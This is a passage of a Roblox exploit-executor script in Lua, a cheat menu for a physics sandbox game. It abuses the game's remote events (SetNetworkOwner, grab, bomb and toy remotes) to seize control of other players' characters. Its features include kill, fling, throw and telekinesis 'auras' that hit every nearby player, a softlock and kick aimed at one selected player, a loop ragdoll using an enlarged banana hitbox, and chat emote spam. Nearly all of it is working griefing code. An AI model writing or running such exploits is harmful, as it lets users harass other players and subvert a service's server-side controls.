                                                        obj.PrimaryPart.RotVelocity = Vector3.zero
                                                    end
                                                end
                                            end)
                                            
                                            sitStart = tick()
                                            while tick() - sitStart < 1 do
                                                if not DestroyTargetGucciActive then break end
                                                if myHum.SeatPart == seat then break end
                                                
                                                seat:Sit(myHum)
                                                task.wait()
                                            end
                                            
                                            if magnetConnection then 
                                                magnetConnection:Disconnect() 
                                            end
                                            
                                            if myHum.SeatPart == seat then
                                                task.wait(0.3)
                                                myHum.Sit = false
                                                myHum.Jump = true
                                                
                                                task.wait(0.05)
                                                myRoot.CFrame = SafeSpot
                                                myRoot.Velocity = Vector3.zero
                                                
                                                task.wait(0.5)
                                            else
                                                myRoot.CFrame = SafeSpot
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                    task.wait(1)
                end
                
                if DestroyTargetGucciActive then
                    DestroyTargetGucciActive = false
                end
            end)
        else
            DestroyTargetGucciActive = false
        end
    end
})

MenuToys = ReplicatedStorage:WaitForChild("MenuToys")
BombExplode = ReplicatedStorage:WaitForChild("BombEvents"):WaitForChild("BombExplode")
kickOutEnabled = false
lastTouchTime = 0
touchCooldown = 0.5
heartbeatConnectionKick = nil
snowballCache = nil
cacheConnection = nil
isSnowballCaching = false
spawnDebounce = false
GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
DestroyGrabLine = GrabEvents:WaitForChild("DestroyGrabLine")

function isSittingOnBlobman(character)
    humanoid = character and character:FindFirstChild("Humanoid")
    seatPart = humanoid and humanoid.SeatPart
    if not seatPart then
        return false
    end
    
    seatParent = seatPart.Parent
    if seatParent and seatParent.Name == "CreatureBlobman" then
        return true
    end
    return false
end

function checkForSeatedTarget()
    if not SelectedPlayer then
        return false
    end
    
    targetPlayer = Players:FindFirstChild(SelectedPlayer)
    if not targetPlayer or not targetPlayer.Character then
        return false
    end
    
    if isSittingOnBlobman(targetPlayer.Character) then
        return true
    end
    return false
end

function spawnSnowball()
    if spawnDebounce then
        return
    end
    spawnDebounce = true

    char = LocalPlayer.Character
    if char and char:FindFirstChild("HumanoidRootPart") then
        task.spawn(function()
            MenuToys.SpawnToyRemoteFunction:InvokeServer("BallSnowball", CFrame.new(char.HumanoidRootPart.Position) * CFrame.Angles(- 0.807, - 0.884, - 0.679), Vector3.new(0, - 60.424, 0))
        end)
    end

    task.delay(0.1, function()
        spawnDebounce = false
    end)
end

function startSnowballCache()
    if isSnowballCaching then
        return
    end
    isSnowballCaching = true

    toysFolder = Workspace:WaitForChild(LocalPlayer.Name .. "SpawnedInToys")

    cacheConnection = toysFolder.ChildAdded:Connect(function(child)
        if child.Name == "BallSnowball" then
            soundPart = child:WaitForChild("SoundPart", 1)
            if not soundPart then
                return
            end

            SetNetworkOwner:FireServer(soundPart, soundPart.CFrame)
            DestroyGrabLine:FireServer(soundPart)

            partOwner = soundPart:WaitForChild("PartOwner", 0.5)
            if partOwner and partOwner.Value == LocalPlayer.Name then
                ragdollPart = child:FindFirstChild("SnowRagdollPart")
                if ragdollPart then
                    ragdollPart.Size = Vector3.new(5, 5, 5)
                    ragdollPart.CanCollide = true
                    ragdollPart.Transparency = 1
                end

                ownershipConnection = partOwner:GetPropertyChangedSignal("Value"):Connect(function()
                    if partOwner.Value ~= LocalPlayer.Name then
                        MenuToys.DestroyToy:FireServer(child)
                        ownershipConnection:Disconnect()
                    end
                end)

                child.AncestryChanged:Connect(function()
                    if not child.Parent then
                        snowballCache = nil
                        if ownershipConnection then
                            ownershipConnection:Disconnect()
                        end
                    end
                end)

                snowballCache = child
            else
                MenuToys.DestroyToy:FireServer(child)
            end
        end
    end)

    task.spawn(function()
        while isSnowballCaching do
            if checkForSeatedTarget() then
                if not snowballCache or not snowballCache.Parent then
                    spawnSnowball()
                end
            else
                if snowballCache and snowballCache.Parent then
                    MenuToys.DestroyToy:FireServer(snowballCache)
                    snowballCache = nil
                end
            end
            RunService.Heartbeat:Wait()
        end
    end)
end

function handleKickOut()
    if not SelectedPlayer then
        return
    end
    
    targetPlayer = Players:FindFirstChild(SelectedPlayer)
    if not targetPlayer or not targetPlayer.Character then
        return
    end

    targetChar = targetPlayer.Character
    targetRoot = targetChar:FindFirstChild("HumanoidRootPart")

    if not targetRoot or not isSittingOnBlobman(targetChar) then
        return
    end

    if snowballCache and snowballCache.Parent then
        soundPart = snowballCache:FindFirstChild("SoundPart")
        ragdollPart = snowballCache:FindFirstChild("SnowRagdollPart")

        if ragdollPart and soundPart then
            currentTime = tick()
            if currentTime - lastTouchTime >= touchCooldown then
                targetTorso = targetChar:FindFirstChild("UpperTorso") or targetChar:FindFirstChild("Torso")
                if targetTorso then
                    ragdollPart.CFrame = targetTorso.CFrame

                    task.spawn(function()
                        pcall(function()
                            firetouchinterest(ragdollPart, targetTorso, 0)
                            firetouchinterest(ragdollPart, targetTorso, 1)
                        end)
                    end)

                    task.wait(0.2)

                    BombExplode:FireServer({
                        Radius = 5.196,
                        Model = soundPart,
                        Hitbox = soundPart,
                        Type = "SnowPoof",
                        PositionPart = soundPart
                    }, targetRoot.Position)

                    lastTouchTime = currentTime
                    snowballCache = nil
                end
            end
        end
    end
end

LoopTab:CreateToggle({
    Name = "Anti blob (snowball)",
    CurrentValue = false,
    Callback = function(Value)
        kickOutEnabled = Value
        
        if Value then
            if not SelectedPlayer then
                kickOutEnabled = false
                print("ts sucks")
                return
            end
            
            startSnowballCache()

            if heartbeatConnectionKick then
                heartbeatConnectionKick:Disconnect()
            end
            heartbeatConnectionKick = RunService.Heartbeat:Connect(function()
                handleKickOut()
            end)
            print("Kick Selected Player from Blobman active - ok: " .. SelectedPlayer)
        else
            isSnowballCaching = false
            if heartbeatConnectionKick then
                heartbeatConnectionKick:Disconnect()
                heartbeatConnectionKick = nil
            end
            if cacheConnection then
                cacheConnection:Disconnect()
                cacheConnection = nil
            end
            if snowballCache and snowballCache.Parent then
                MenuToys.DestroyToy:FireServer(snowballCache)
                snowballCache = nil
            end
            print("Kick Selected Player from Blobman disable")
        end
    end
})


Players = game:GetService("Players")
ReplicatedStorage = game:GetService("ReplicatedStorage")
LocalPlayer = Players.LocalPlayer

lockLoopActive = false

function isnetworkowner(part)
    return part and part:IsDescendantOf(workspace) and part.ReceiveAge == 0
end

function FWC(Parent, Name, Time)
    return Parent:FindFirstChild(Name) or Parent:WaitForChild(Name, Time)
end

function grab(HRP)
    pcall(function()
        ReplicatedStorage.GrabEvents.SetNetworkOwner:FireServer(HRP, HRP.CFrame)
    end)
end

function blob_lock(blob, hrp, rl, v)
    local detec = FWC(blob, rl .. "Detector", 0.1)
    if detec then
        local grab = blob.BlobmanSeatAndOwnerScript.CreatureGrab
        local drop = blob.BlobmanSeatAndOwnerScript.CreatureDrop
        local rel = blob.BlobmanSeatAndOwnerScript.CreatureRelease
        if v == "Default" and detec then
            grab:FireServer(detec, hrp, detec[rl .. "Weld"])
        elseif v == "DDrop" then
            drop:FireServer(detec[rl .. "Weld"])
        elseif v == "Release" then
            rel:FireServer(detec[rl .. "Weld"], hrp)
        end
    end
end

BlobTab:CreateToggle({
    Name = "Softlock",
    CurrentValue = false,
    Flag = "LoopLock",
    Callback = function(Value)
        lockLoopActive = Value
        
        if Value then
            if not SelectedPlayer then
                lockLoopActive = false
                return
            end
            
            task.spawn(function()
                local MyBlob
                local Time = tick()
                local lastCheck = 0
                
                while lockLoopActive do
                    local currentTime = tick()
                    local mychar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                    local myHRP = FWC(mychar, "HumanoidRootPart", 0.1)
                    local myhum = FWC(mychar, "Humanoid", 0.1)
                    
                    if myhum and myhum.SeatPart then
                        MyBlob = myhum.SeatPart.Parent
                    end
                    
                    local targetPlr = Players:FindFirstChild(SelectedPlayer)
                    if targetPlr then
                        local char = targetPlr.Character
                        local hum = char and FWC(char, "Humanoid", 0.1)
                        local HRP = char and FWC(char, "HumanoidRootPart", 0.1)
                        
                        if HRP and hum and MyBlob and MyBlob.Parent then
                            if isnetworkowner(HRP) then
                                if currentTime - Time > 0.1 then
                                    hum.Sit = true
                                    task.wait(0.01)
                                    hum.Sit = false
                                    Time = currentTime
                                end
                                
                                local LD = MyBlob:FindFirstChild("LeftDetector")
                                if LD then
                                    HRP.CFrame = LD.CFrame
                                end
                                
                                for _, v in pairs(char:GetChildren()) do
                                    if v:IsA("BasePart") then
                                        v.Velocity = Vector3.new()
                                    end
                                end
                                
                                if myHRP and (myHRP.Position - HRP.Position).Magnitude < 40 and hum.SeatPart then
                                    grab(HRP)
                                end
                            end
                            
                            if currentTime - lastCheck > 0 then
                                blob_lock(MyBlob, HRP, "Left", "Default")
                                blob_lock(MyBlob, HRP, "Left", "Release")
                                lastCheck = currentTime
                            end
                        end
                    end
                    task.wait(0)
                end
            end)
        end
    end
})




Players = game:GetService("Players")
ReplicatedStorage = game:GetService("ReplicatedStorage")
RunService = game:GetService("RunService")
LocalPlayer = Players.LocalPlayer

kickLoopActive = false

function FWC(Parent, Name, Time)
    return Parent:FindFirstChild(Name) or Parent:WaitForChild(Name, Time)
end

function blob_kick(blob, hrp, rl, v)
    local detec = FWC(blob, rl .. "Detector", 1)
    if detec then
        local grab = blob.BlobmanSeatAndOwnerScript.CreatureGrab
        local drop = blob.BlobmanSeatAndOwnerScript.CreatureDrop
        
        if v == "Grab" and detec then
            grab:FireServer(detec, hrp, detec[rl .. "Weld"])
        elseif v == "Drop" then
            drop:FireServer(detec[rl .. "Weld"])
        end
    end
end

BlobTab:CreateToggle({
    Name = "Blobman kick (init)",
    CurrentValue = false,
    Flag = "LoopKick",
    Callback = function(Value)
        kickLoopActive = Value
        
        if Value then
            if not SelectedPlayer then
                kickLoopActive = false
                return
            end
            
            task.spawn(function()
                local MyBlob
                
                while kickLoopActive do
                    local mychar = LocalPlayer.Character
                    if not mychar then
                        task.wait(0.001)
                        continue
                    end
                    
                    local myHRP = FWC(mychar, "HumanoidRootPart", 2)
                    local myhum = FWC(mychar, "Humanoid", 2)
                    if not myhum then
                        task.wait(0.001)
                        continue
                    end
                    
                    if myhum.SeatPart then 
                        MyBlob = myhum.SeatPart.Parent 
                    end
                    
                    local targetPlr = Players:FindFirstChild(SelectedPlayer)
                    if not targetPlr then
                        kickLoopActive = false
                        break
                    end
                    
                    local char = targetPlr.Character
                    if not char then
                        task.wait(0.001)
                        continue
                    end
                    
                    local hum = FWC(char, "Humanoid", 2)
                    local HRP = FWC(char, "HumanoidRootPart", 2)
                    
                    if HRP and hum and MyBlob and MyBlob.Parent then
                        for i = 1, 14 do
                            if not kickLoopActive then break end
                            blob_kick(MyBlob, HRP, "Left", "Grab")
                            blob_kick(MyBlob, HRP, "Right", "Grab")
                            task.wait(0.001)
                            blob_kick(MyBlob, HRP, "Left", "Drop")
                            blob_kick(MyBlob, HRP, "Right", "Drop")
                            task.wait(0.001)
                        end
                    end
                    
                    task.wait(0.001)
                end
            end)
        end
    end,
})


Players = game:GetService("Players")
ReplicatedStorage = game:GetService("ReplicatedStorage")
Workspace = game:GetService("Workspace")

LocalPlayer = Players.LocalPlayer
Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")

PlayerToys = Workspace:WaitForChild(LocalPlayer.Name .. "SpawnedInToys")

Config = {
    v_inf = Vector3.new(math.huge, math.huge, math.huge)
}

GameState = {
    fling_plr_en = false
}

function get_player()
    return LocalPlayer
end

function get_character_cframe(player_char)
    if player_char and player_char:FindFirstChild("HumanoidRootPart") then
        return player_char.HumanoidRootPart
    end
    return nil
end

function spawn_toy(toy_name, cframe_position)
    toy_remote = ReplicatedStorage:WaitForChild("RemoteEvent"):WaitForChild("MiscFunction")
    toy_remote:FireServer("CreateToy", toy_name, cframe_position)
    task.wait(0)
    return PlayerToys:FindFirstChild(toy_name)
end

function teleport_toy(toy_part, target_cframe)
    toy_remote = ReplicatedStorage:WaitForChild("RemoteEvent"):WaitForChild("MiscFunction")
    toy_remote:FireServer("TeleportToy", toy_part, target_cframe)
end

local UserInputService = game:GetService("UserInputService")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")


local textChannel = TextChatService
    :WaitForChild("TextChannels")
    :WaitForChild("RBXGeneral")




local CONFIG = {
    ALL_MESSAGES = {
        "monkey","Hehe","Haha","Whistle","Dad","Mom","sad","yey","kick","pew","grr",
        "one","two","three","four","five","blablabla","pizza","num","lick","sing",
        "yeehaw","elite","sick","oof","caw","ahh","ree","uwu","boo","dead","grab",
        "boom","snap","lol","sneeze","uhh","ayy","ouch","fart","bruh","yeet","pog",
        "sus","noob","alpha","beta","gamma"
    },
    SELECTED_MESSAGES = {},
    DELAY = 0.3,
    REQUIRE_HOLD_TIME = 0
}


local toggleEnabled = false
local isHolding = false
local holdStartTime = 0
local spamConnection


local function getRandomMessage()
    local list = CONFIG.SELECTED_MESSAGES
    if #list == 0 then
        list = CONFIG.ALL_MESSAGES
    end
    return list[math.random(#list)]
end


local function startSpamLoop()
    if spamConnection then
        spamConnection:Disconnect()
    end

    spamConnection = RunService.Heartbeat:Connect(function()
        if toggleEnabled and isHolding and tick() - holdStartTime >= CONFIG.REQUIRE_HOLD_TIME then
            textChannel:SendAsync("/e " .. getRandomMessage())
            task.wait(CONFIG.DELAY)
        end
    end)
end

local function stopSpam()
    isHolding = false
    if spamConnection then
        spamConnection:Disconnect()
        spamConnection = nil
    end
end

LoopTab:CreateDivider()

LoopTab:CreateToggle({
    Name = "Taunt(hold G)",
    CurrentValue = false,
    Callback = function(Value)
        toggleEnabled = Value
        if not Value then
            stopSpam()
        end
    end
})


LoopTab:CreateDropdown({
    Name = "Sounds(some dont work)",
    Options = CONFIG.ALL_MESSAGES,
    CurrentOption = {},
    MultipleOptions = true,
    Callback = function(Options)
        CONFIG.SELECTED_MESSAGES = Options
    end
})


UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if not toggleEnabled then return end

    if input.KeyCode == Enum.KeyCode.G then
        isHolding = true
        holdStartTime = tick()
        startSpamLoop()
    end
end)

UserInputService.InputEnded:Connect(function(input, processed)
    if processed then return end
    if not toggleEnabled then return end

    if input.KeyCode == Enum.KeyCode.G then
        stopSpam()
    end
end)

BlobTab:CreateButton({
    Name = "TP to guy and go back to pos (for lock)",
    Callback = function()
        if not SelectedPlayer then
            print("who tf?")
            return
        end
        
        local char = LocalPlayer.Character
        if not char then
            return
        end
        
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not hrp then
            return
        end
        
        local targetPlayer = Players:FindFirstChild(SelectedPlayer)
        if not targetPlayer then
            print("huhh ")
            return
        end
        
        local targetChar = targetPlayer.Character
        if not targetChar then
            return
        end
        
        local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
        if not targetHRP then
            return
        end
        
        local originalPosition = hrp.CFrame
        
        hrp.CFrame = targetHRP.CFrame * CFrame.new(0, 0, - 3)
        task.wait(1)
        hrp.CFrame = originalPosition
    end
})

Players.PlayerRemoving:Connect(function()
    task.wait(0)
    PlayerDropdown:Refresh(getPlayerList(), true)
end)
LocalPlayer.CharacterAdded:Connect(function(char)
    initCharAttrs()
    local hum = char:WaitForChild("Humanoid", 5)
    if hum then
        hum.Died:Connect(function()
            cameraAnchor:detach()
        end)
    end
end)

Players = game:GetService("Players")
RunService = game:GetService("RunService")
ReplicatedStorage = game:GetService("ReplicatedStorage")
Workspace = game:GetService("Workspace")

LocalPlayer = Players.LocalPlayer

GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
MenuToys = ReplicatedStorage:WaitForChild("MenuToys")
HoldEvents = ReplicatedStorage:WaitForChild("HoldEvents")

SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
CreateGrabLine = GrabEvents:WaitForChild("CreateGrabLine")
ExtendGrabLine = GrabEvents:WaitForChild("ExtendGrabLine")
DestroyGrabLine = GrabEvents:WaitForChild("DestroyGrabLine")
SpawnToy = MenuToys:WaitForChild("SpawnToyRemoteFunction")
DestroyToy = MenuToys:WaitForChild("DestroyToy")
UseRemote = HoldEvents:WaitForChild("Use")

BananaLoopActive = false
HitboxSize = 10
currentBanana = nil
currentPeel = nil

function sno(part)
    if part and part.Parent then
        SetNetworkOwner:FireServer(part, part.CFrame)
    end
end

function GetBananaPeel(banana)
    if not banana then
        return nil
    end
    return banana:FindFirstChild("BananaPeel")
end

function EnlargeHitboxes(peel)
    if not peel then
        return
    end
    
    for _, child in ipairs(peel:GetChildren()) do
        if child.Name == "HitboxPart" and child:IsA("BasePart") then
            child.Size = child.Size * HitboxSize
            child.Transparency = 0.8
            child.CanCollide = false
        end
    end
end

function TakeOwnershipPeel(part)
    if not part or not part.Parent then
        return
    end
    
    pcall(function()
        CreateGrabLine:FireServer(part, part.CFrame)
        task.wait(0.05)
        
        ExtendGrabLine:FireServer(8.5)
        task.wait(0.05)
        
        SetNetworkOwner:FireServer(part, part.CFrame)
        task.wait(0.05)
        
        DestroyGrabLine:FireServer(part)
    end)
end

LoopTab:CreateToggle({
    Name = "Loop ragdoll(banana)",
    CurrentValue = false,
    Callback = function(Value)
        BananaLoopActive = Value
        
        if Value then
            if not SelectedPlayer then
                BananaLoopActive = false
                print("get banana'd loser")
                return
            end
            
            task.spawn(function()
                char = LocalPlayer.Character
                hrp = char and char:FindFirstChild("HumanoidRootPart")
                
                if not hrp then
                    BananaLoopActive = false
                    return
                end
                
                SpawnToy:InvokeServer("FoodBanana", hrp.CFrame * CFrame.new(0, 2, 0), Vector3.new(0, 170, 0))
                task.wait(0.5)
                
                toysFolder = Workspace:FindFirstChild(LocalPlayer.Name .. "SpawnedInToys")
                currentBanana = toysFolder and toysFolder:FindFirstChild("FoodBanana")
                
                if not currentBanana then
                    print("Failed to find banana!")
                    BananaLoopActive = false
                    return
                end
                
                holdPart = currentBanana:FindFirstChild("HoldPart")
                holdRemote = holdPart and holdPart:FindFirstChild("HoldItemRemoteFunction")
                if holdRemote then
                    holdRemote:InvokeServer(currentBanana, char)
                end
                task.wait(0.5)
                
                UseRemote:FireServer(currentBanana)
                task.wait(3)
                
                dropRemote = holdPart and holdPart:FindFirstChild("DropItemRemoteFunction")
                if dropRemote then
                    dropRemote:InvokeServer(currentBanana, hrp.CFrame, Vector3.new(0, 170, 0))
                end
                task.wait(0.5)
                
                currentPeel = GetBananaPeel(currentBanana)
                hitboxPart = currentBanana:FindFirstChild("HitboxPart")
                
                if not currentPeel then
                    print("Failed to get banana peel!")
                    BananaLoopActive = false
                    return
                end
                
                if hitboxPart then
                    TakeOwnershipPeel(hitboxPart)
                end
                task.wait(0.5)
                
                EnlargeHitboxes(currentPeel)
                
                print("Starting loop TP on target")
                
                while BananaLoopActive do
                    targetPlayer = Players:FindFirstChild(SelectedPlayer)
                    if not targetPlayer then
                        BananaLoopActive = false
                        break
                    end
                    
                    targetChar = targetPlayer.Character
                    if not targetChar then
                        task.wait(0.1)
                        continue
                    end
                    
                    targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
                    targetHum = targetChar:FindFirstChild("Humanoid")
                    
                    if not targetHRP or not targetHum or targetHum.Health == 0 then
                        task.wait(0.1)
                        continue
                    end
                    
                    if not currentPeel or not currentPeel.Parent then
                        print("Peel destroyed, stopping...")
                        BananaLoopActive = false
                        break
                    end
                    
                    hitboxPart = currentBanana and currentBanana:FindFirstChild("HitboxPart")
                    
                    if hitboxPart then
                        TakeOwnershipPeel(hitboxPart)
                    end
                    
                    for _, child in ipairs(currentPeel:GetChildren()) do
                        if child:IsA("BasePart") then
                            pcall(function()
                                child.CFrame = targetHRP.CFrame * CFrame.new(0, - 2, 0)
                            end)
                        end
                    end
                    
                    if hitboxPart then
                        pcall(function()
                            hitboxPart.CFrame = targetHRP.CFrame * CFrame.new(0, - 2, 0)
                        end)
                    end
                end
                
                if currentBanana and currentBanana.Parent then
                    DestroyToy:FireServer(currentBanana)
                end
                currentBanana = nil
                currentPeel = nil
                
                print("Banana Ragdoll stopped")
            end)
        else
            BananaLoopActive = false
            
            if currentBanana and currentBanana.Parent then
                DestroyToy:FireServer(currentBanana)
            end
            currentBanana = nil
            currentPeel = nil
            
            print("Banana Ragdoll disabled")
        end
    end
})


AuraTab:CreateSection("for the annoying kids")
-- Death Aura
local function isFriend(player) return false end
local function canInteractWithTarget(targetChar) return true end
local function handlePartOwner(targetChar, callback)
    local root = targetChar:FindFirstChild("HumanoidRootPart")
    if root then
        SetNetworkOwner:FireServer(root, root.CFrame)
        callback()
    end
end
local function performDeathAura()
    getgenv().deathAuraConnection = RunService.Heartbeat:Connect(function()
        local c = LocalPlayer.Character
        local hrp = c and c:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and not isFriend(player) then
                local targetChar = player.Character
                if targetChar and canInteractWithTarget(targetChar) then
                    local tRoot = targetChar:FindFirstChild("HumanoidRootPart")
                    local tHum = targetChar:FindFirstChild("Humanoid")
                    if tRoot and tHum and (hrp.Position - tRoot.Position).Magnitude <= 29 then
                        SetNetworkOwner:FireServer(tRoot, tRoot.CFrame)
                        DestroyGrabLine:FireServer(tRoot)
                        handlePartOwner(targetChar, function()
                            for _, part in pairs(tHum.Parent:GetChildren()) do
                                if part:IsA("BasePart") then
                                    part.CFrame = CFrame.new(-9e11, 9e12, -9e11)
                                end
                            end
                            task.wait()
                            for _, part in pairs(tHum.Parent:GetChildren()) do
                                if part:IsA("BasePart") then
                                    part.CFrame = CFrame.new(-9e11, 9e12, -9e11)
                                end
                            end
                            local bodyVelocity = Instance.new("BodyVelocity")
                            bodyVelocity.Velocity = Vector3.new(0, 9e10, 0)
                            bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            bodyVelocity.P = 100000075
                            bodyVelocity.Parent = tRoot
                            tHum.BreakJointsOnDeath = false
                            tHum:ChangeState(Enum.HumanoidStateType.Dead)
                            task.delay(2, function()
                                if bodyVelocity and bodyVelocity.Parent then bodyVelocity:Destroy() end
                            end)
                        end)
                    end
                end
            end
        end
    end)
end
local function stopDeathAura()
    if getgenv().deathAuraConnection then getgenv().deathAuraConnection:Disconnect() getgenv().deathAuraConnection = nil end
end
AuraTab:CreateToggle({ Name = 'kill Aura	 <font face="GothamBlack" color="rgb(255,0,0)">fuh off</font>	<font face="GothamBlack" color="rgb(7,255,0)">nub</font>', CurrentValue = false, Flag = "DeathAura", Callback = function(v) if v then performDeathAura() else stopDeathAura() end end })


local function performKickAura()
    getgenv().kickAuraConnection = RunService.Heartbeat:Connect(function()
        local c = LocalPlayer.Character
        local hrp = c and c:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and not isFriend(player) then
                local targetChar = player.Character
                if targetChar and canInteractWithTarget(targetChar) then
                    local tRoot = targetChar:FindFirstChild("HumanoidRootPart")
                    if tRoot and (hrp.Position - tRoot.Position).Magnitude <= 29 then
                        SetNetworkOwner:FireServer(tRoot, tRoot.CFrame)
                        DestroyGrabLine:FireServer(tRoot)
                        handlePartOwner(targetChar, function()
                            tRoot.CFrame = CFrame.new(0, 9e13, 0)
                            task.wait()
                            tRoot.CFrame = CFrame.new(0, 9e11, 0)
                            local bodyVelocity = Instance.new("BodyVelocity")
                            bodyVelocity.Velocity = Vector3.new(0, 9e12, 0)
                            bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            bodyVelocity.P = 100000000075
                            bodyVelocity.Parent = tRoot
                            task.delay(2, function()
                                if bodyVelocity and bodyVelocity.Parent then bodyVelocity:Destroy() end
                            end)
                        end)
                    end
                end
            end
        end
    end)
end
local function stopKickAura()
    if getgenv().kickAuraConnection then getgenv().kickAuraConnection:Disconnect() getgenv().kickAuraConnection = nil end
end
AuraTab:CreateToggle({ Name = 'heaven send Aura	<font face="GothamBlack" color="rgb(255,0,0)">fuh off</font>	  <font face="GothamBlack" color="rgb(7,255,0)">bum</font>   <font face="GothamBlack" color="rgb(39,245,218)">wow</font>', CurrentValue = false, Flag = "KickAura", Callback = function(v) if v then performKickAura() else stopKickAura() end end })

-- Throw Aura
local throwSpeed = 100
local throwRadius = 30
local throwBodies, throwConnection = {}, nil
AuraTab:CreateToggle({
    Name = 'Throw Aura	  <font face="GothamBlack" color="rgb(7,255,0)">bro</font>',
    CurrentValue = false,
    Flag = "ThrowAura",
    Callback = function(enabled)
        if enabled then
            throwConnection = RunService.Heartbeat:Connect(function()
                local centerRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not centerRoot then return end
                local centerPos = centerRoot.Position
                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer and player.Character then
                        local root = player.Character:FindFirstChild("HumanoidRootPart")
                        if root and (root.Position - centerPos).Magnitude <= throwRadius then
                            local bv = root:FindFirstChild("ThrowBV")
                            if not bv then
                                bv = Instance.new("BodyVelocity")
                                bv.Name = "ThrowBV"
                                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                bv.Parent = root
                                throwBodies[root] = bv
                            end
                            bv.Velocity = Vector3.new(
                                math.random(-throwSpeed, throwSpeed),
                                math.random(5, throwSpeed),
                                math.random(-throwSpeed, throwSpeed)
                            )
                            pcall(function() SetNetworkOwner:FireServer(root, root.CFrame) end)
                        else
                            if throwBodies[root] then
                                throwBodies[root]:Destroy()
                                throwBodies[root] = nil
                            end
                        end
                    end
                end
            end)
        else
            if throwConnection then throwConnection:Disconnect() throwConnection = nil end
            for _, bv in pairs(throwBodies) do if bv and bv.Parent then bv:Destroy() end end
            throwBodies = {}
        end
    end,
})
AuraTab:CreateSlider({ Name = "Throw Speed", Range = {10, 1000}, Increment = 1, Suffix = "Velocity", CurrentValue = throwSpeed, Flag = "ThrowSpeed", Callback = function(v) throwSpeed = v end })

-- Telekinesis Aura
local Bodies, SetNetworkQueue, SetNetworkBusy = {}, {}, false
local Active, TornadoOffset, TornadoHeight, TornadoSpeed = false, 10, 5, 0.1
local TornadoFollowPlayer, fallbackPosition = "", Vector3.new(0, 10, 0)
local function ClearBodies()
    for _, v in pairs(Bodies) do if v and v.Parent then v:Destroy() end end
    Bodies, SetNetworkQueue, SetNetworkBusy = {}, {}, false
end
local function ApplyMotion(part, cframe, angle, radius, height)
    if not part or part.Anchored then return end
    local bp = part:FindFirstChild("TornadoAuraVelocity")
    if not bp then
        bp = Instance.new("BodyPosition")
        bp.Name = "TornadoAuraVelocity"
        bp.MaxForce = Vector3.new(1e6,1e6,1e6)
        bp.P = 50000
        bp.D = 1250
        bp.Parent = part
        table.insert(Bodies, bp)
    end
    bp.Position = Vector3.new(
        cframe.Position.X + math.cos(angle) * radius,
        cframe.Position.Y + height,
        cframe.Position.Z + math.sin(angle) * radius
    )
    local bav = part:FindFirstChild("TornadoAuraAngularVelocity")
    if not bav then
        bav = Instance.new("BodyAngularVelocity")
        bav.Name = "TornadoAuraAngularVelocity"
        bav.MaxTorque = Vector3.new(1e5,1e5,1e5)
        bav.AngularVelocity = Vector3.new(0,TornadoSpeed*10,0)
        bav.Parent = part
    else
        bav.AngularVelocity = Vector3.new(0,TornadoSpeed*10,0)
    end
end
local function SetNetworkOwnerPart(part)
    if not part or part.Anchored then return end
    pcall(function() SetNetworkOwner:FireServer(part, part.CFrame, part) end)
    part:SetAttribute("SetNetworkDone", true)
end
local function GetPlayerRoot(player)
    local char = player.Character
    if char then return char:FindFirstChild("HumanoidRootPart") end
end
local function ProcessTargets(centerCFrame, angle)
    local lpRoot = GetPlayerRoot(LocalPlayer)
    local lpPos = lpRoot and lpRoot.Position or fallbackPosition
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            local root = GetPlayerRoot(p)
            if root and not root.Anchored then
                ApplyMotion(root, centerCFrame, angle, TornadoOffset, TornadoHeight)
                if (root.Position - lpPos).Magnitude <= 15 then
                    SetNetworkOwnerPart(root)
                end
            end
        end
    end
end
RunService.Heartbeat:Connect(function()
    if not Active then ClearBodies() return end
    local centerCFrame
    if TornadoFollowPlayer ~= "" then
        local tp = Players:FindFirstChild(TornadoFollowPlayer)
        centerCFrame = tp and GetPlayerRoot(tp) and GetPlayerRoot(tp).CFrame or CFrame.new(fallbackPosition)
    else
        local root = GetPlayerRoot(LocalPlayer)
        centerCFrame = root and root.CFrame or CFrame.new(fallbackPosition)
    end
    local angle = (tick()*TornadoSpeed*2*math.pi) % (2*math.pi)
    ProcessTargets(centerCFrame, angle)
end)
AuraTab:CreateSection('Telekinesis Aura')
AuraTab:CreateToggle({ Name = 'Telekinesis Aura	   <font face="GothamBlack" color="rgb(7,255,0)">send em</font>', CurrentValue = false, Flag = "TelekinesisAura", Callback = function(v) Active = v if not v then ClearBodies() end end })
local PlayerDropdown = AuraTab:CreateDropdown({
    Name = "Select Player",
    Options = {},
    CurrentOption = {},
    MultipleOptions = false,
    Flag = "PlayerDropdown",
    Callback = function(option)
        TornadoFollowPlayer = option[1]:match("@([%w_]+)")
    end
})
local function optionText(plr)
    return string.format("👤 @%s (%s)", plr.Name, plr.DisplayName or "")
end
local function refreshDropdown()
    local opts = {}
    for _, p in ipairs(Players:GetPlayers()) do
        table.insert(opts, optionText(p)) 
    end
    PlayerDropdown:Refresh(opts)
end
Players.PlayerAdded:Connect(function()
    task.wait(0.5)
    refreshDropdown()
end)
Players.PlayerRemoving:Connect(function()
    task.wait(0.5)
    refreshDropdown()
end)
refreshDropdown()
AuraTab:CreateSlider({ Name = "Distance", Range = {1,10000}, Increment = 1, Suffix = "Offset", CurrentValue = TornadoOffset, Flag = "AuraDistance", Callback = function(v) TornadoOffset = v end })
